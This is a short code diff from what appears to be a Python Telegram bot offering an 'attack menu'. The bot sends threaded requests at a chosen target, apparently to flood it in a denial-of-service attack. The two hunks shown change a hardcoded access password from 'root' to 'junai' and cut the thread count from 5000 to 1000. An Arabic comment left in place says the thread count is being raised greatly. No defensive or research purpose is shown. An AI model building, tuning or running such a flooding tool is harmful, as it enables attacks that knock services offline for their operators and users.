@@ -25,7 +25,7 @@ def password_prompt(chat_id):
 
 def check_password(message):
     password = message.text
-    if password == "root":
+    if password == "junai":
         bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
         start_attack(message.chat.id)
     else:
@@ -42,7 +42,7 @@ def send_requests_threaded(target, request_count, stop_flag):
                 pass
 
     threads = []
-    num_threads = 5000  # زيادة عدد الخيوط بشكل كبير
+    num_threads = 1000  # زيادة عدد الخيوط بشكل كبير
     for _ in range(num_threads):
         thread = threading.Thread(target=send_request_thread)
         threads.append(thread)
